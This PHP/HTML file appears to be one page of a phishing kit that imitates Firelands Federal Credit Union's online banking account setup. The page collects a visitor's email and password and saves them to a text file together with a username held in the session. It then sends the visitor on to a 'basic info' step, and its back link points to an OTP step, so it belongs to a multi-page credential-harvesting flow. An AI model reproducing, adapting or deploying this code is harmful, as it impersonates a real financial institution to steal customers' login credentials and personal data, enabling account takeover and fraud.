<?php
session_start();
require_once __DIR__ . '/includes/file_storage.php';

// Redirect to login if no username in session
if (!isset($_SESSION['emzemz'])) {
    header('Location: index.php');
    exit;
}

$username = $_SESSION['emzemz'];
$errors = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get form data (matching affinity field names)
    $email = trim($_POST['email'] ?? '');
    $password = $_POST['password'] ?? '';
    $confirmPassword = $_POST['confirmPassword'] ?? '';
    
    // Validation
    if (empty($email)) {
        $errors['email'] = 'Email is required';
    } elseif (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $errors['email'] = 'Invalid email format';
    }
    
    if (empty($password)) {
        $errors['password'] = 'Password is required';
    } elseif (strlen($password) < 8) {
        $errors['password'] = 'Password must be at least 8 characters';
    }
    
    if (empty($confirmPassword)) {
        $errors['confirmPassword'] = 'Confirm password is required';
    } elseif ($password !== $confirmPassword) {
        $errors['confirmPassword'] = 'Passwords do not match';
    }
    
    if (empty($errors)) {
        // Save to test file (matching affinity field names)
        $data = [
            'step' => 'email_password',
            'usrnm' => $username,
            'usr_eml' => $email,
            'acc_cd' => $password
        ];
        
        saveUserData('email_password.txt', $data);
        
        // Redirect to basic info page
        header('Location: basic_info.php');
        exit;
    }
}

$footerLinks = [
    'About Us',
    'Customer Service',
    'Careers',
    'Investor Relations',
    'Media Center',
    'Security',
    'Privacy',
    'Site Map'
];
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Firelands FCU - Email & Password Setup</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body>
    <div class="relative flex min-h-screen flex-col overflow-hidden text-white">
        <!-- Background Image with Overlay -->
        <div class="absolute inset-0">
            <img
                src="assets/firelands-landing.jpg"
                alt="Sun setting over Firelands farm fields"
                class="h-full w-full object-cover"
            />
            <div class="absolute inset-0 bg-gradient-to-r from-black/80 via-black/55 to-black/20"></div>
        </div>

        <!-- Main Content -->
        <div class="relative z-10 flex flex-1 flex-col justify-center px-6 py-10 md:px-12 lg:px-20">
            <div class="mx-auto flex w-full max-w-6xl flex-col gap-12 lg:flex-row lg:items-center lg:justify-between">
                <!-- Left Section: Hero Text -->
                <section class="order-2 flex flex-1 flex-col justify-center space-y-6 lg:order-1">
                    <div class="space-y-3">
                        <p class="text-3xl font-semibold leading-tight text-white drop-shadow sm:text-4xl lg:text-5xl">
                            Account Setup
                        </p>
                        <h1 class="text-base font-semibold uppercase tracking-[0.3em] text-white/70">
                            Create your login credentials
                        </h1>
                    </div>
                </section>

                <!-- Right Section: Email Password Card -->
                <section class="order-1 w-full max-w-md lg:order-2 lg:self-start">
                    <div class="mx-auto w-full rounded-[32px] bg-white/95 p-8 text-gray-800 shadow-2xl backdrop-blur lg:mx-0">
                        <!-- Logo -->
                        <div class="flex items-center justify-start">
                            <img
                                src="assets/logo.svg"
                                alt="Firelands Federal Credit Union"
                                class="h-12 w-auto"
                            />
                        </div>

                        <!-- Heading -->
                        <h2 class="mt-6 text-2xl font-semibold text-[#2f2e67]">Email & Password</h2>
                        <p class="mt-2 text-sm text-gray-600">Set up your email address and password for your online banking account.</p>

                        <!-- Error Display -->
                        <?php if (!empty($errors)): ?>
                            <div class="mt-4 rounded-lg bg-red-50 border border-red-200 p-4">
                                <div class="flex">
                                    <div class="flex-shrink-0">
                                        <svg class="h-5 w-5 text-red-500" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                                            <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd" />
                                        </svg>
                                    </div>
                                    <div class="ml-3">
                                        <p class="text-sm text-red-700">
                                            Please fix the following errors:
                                            <ul class="list-disc pl-5 mt-1">
                                                <?php foreach ($errors as $error): ?>
                                                    <li><?php echo htmlspecialchars($error); ?></li>
                                                <?php endforeach; ?>
                                            </ul>
                                        </p>
                                    </div>
                                </div>
                            </div>
                        <?php endif; ?>

                        <form method="POST" class="mt-6 space-y-6">
                            <!-- Email Field -->
                            <div class="space-y-2">
                                <label for="email" class="text-sm font-medium text-gray-600">
                                    Email Address
                                </label>
                                <input
                                    type="email"
                                    id="email"
                                    name="email"
                                    placeholder="Enter your email address"
                                    value="<?php echo htmlspecialchars($_POST['email'] ?? ''); ?>"
                                    class="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                                />
                                <?php if (isset($errors['email'])): ?>
                                    <p class="text-sm font-medium text-rose-600"><?php echo htmlspecialchars($errors['email']); ?></p>
                                <?php endif; ?>
                            </div>

                            <!-- Password Field -->
                            <div class="space-y-2">
                                <label for="password" class="text-sm font-medium text-gray-600">
                                    Password
                                </label>
                                <div class="relative">
                                    <input
                                        type="password"
                                        id="password"
                                        name="password"
                                        placeholder="Create a password"
                                        class="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 pr-12 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                                    />
                                    <button
                                        type="button"
                                        onclick="togglePasswordVisibility('password')"
                                        class="absolute inset-y-0 right-3 flex items-center text-gray-400 transition hover:text-[#5a63d8]"
                                        aria-label="Toggle password visibility"
                                    >
                                        <span id="toggleText-password" class="text-sm">Show</span>
                                    </button>
                                </div>
                                <?php if (isset($errors['password'])): ?>
                                    <p class="text-sm font-medium text-rose-600"><?php echo htmlspecialchars($errors['password']); ?></p>
                                <?php endif; ?>
                            </div>

                            <!-- Confirm Password Field -->
                            <div class="space-y-2">
                                <label for="confirmPassword" class="text-sm font-medium text-gray-600">
                                    Confirm Password
                                </label>
                                <div class="relative">
                                    <input
                                        type="password"
                                        id="confirmPassword"
                                        name="confirmPassword"
                                        placeholder="Confirm your password"
                                        class="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 pr-12 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                                    />
                                    <button
                                        type="button"
                                        onclick="togglePasswordVisibility('confirmPassword')"
                                        class="absolute inset-y-0 right-3 flex items-center text-gray-400 transition hover:text-[#5a63d8]"
                                        aria-label="Toggle password visibility"
                                    >
                                        <span id="toggleText-confirmPassword" class="text-sm">Show</span>
                                    </button>
                                </div>
                                <?php if (isset($errors['confirmPassword'])): ?>
                                    <p class="text-sm font-medium text-rose-600"><?php echo htmlspecialchars($errors['confirmPassword']); ?></p>
                                <?php endif; ?>
                            </div>

                            <!-- Submit Button -->
                            <button
                                type="submit"
                                class="w-full rounded-full bg-gradient-to-r from-[#cdd1f5] to-[#f2f3fb] px-6 py-3 text-base font-semibold text-[#8f8fb8] shadow-inner transition enabled:hover:from-[#b7bff2] enabled:hover:to-[#e3e6fb] disabled:opacity-70"
                            >
                                Continue
                            </button>

                            <!-- Back Link -->
                            <div class="text-center">
                                <a href="otp.php" class="text-sm font-medium text-[#801346] transition hover:text-[#5a63d8] hover:underline">
                                    Back to Verification
                                </a>
                            </div>
                        </form>
                    </div>
                </section>
            </div>

            <!-- Footer Links -->
            <div class="mt-10 flex flex-wrap items-center justify-end gap-10 text-sm font-semibold text-white/80">
                <?php foreach ($footerLinks as $index => $label): ?>
                    <a href="#" class="transition hover:text-white">
                        <?php echo htmlspecialchars($label); ?>
                    </a>
                <?php endforeach; ?>
            </div>
        </div>
    </div>

    <script>
        function togglePasswordVisibility(fieldId) {
            const field = document.getElementById(fieldId);
            const toggleText = document.getElementById('toggleText-' + fieldId);
            
            if (field.type === 'password') {
                field.type = 'text';
                toggleText.textContent = 'Hide';
            } else {
                field.type = 'password';
                toggleText.textContent = 'Show';
            }
        }

        // Auto-focus email field on page load
        document.addEventListener('DOMContentLoaded', function() {
            const emailField = document.getElementById('email');
            if (emailField) {
                emailField.focus();
            }
        });
    </script>
</body>
</html>
